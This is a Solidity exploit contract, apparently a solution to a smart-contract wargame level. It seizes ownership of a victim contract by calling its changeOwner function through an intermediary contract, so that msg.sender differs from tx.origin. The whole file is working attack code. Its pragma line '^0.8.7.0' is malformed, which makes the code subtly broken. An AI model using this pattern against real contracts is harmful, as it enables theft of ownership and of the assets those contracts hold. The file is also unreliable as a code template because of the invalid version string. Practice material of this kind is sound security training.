// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7.0;

interface VictimInterface {
  function changeOwner(address _owner) external;
}

contract Telephone {
  address public victimAddress;

  constructor(address _victimAddress) {
      victimAddress = _victimAddress;
  }

  function claimOwnership() public {
    // the msg.sender will be the contract and
    // the tx.origin will be the sender address, then 
    // tx.origin != msg.sender condition will be satisfied.
    VictimInterface(victimAddress).changeOwner(msg.sender);
  }
}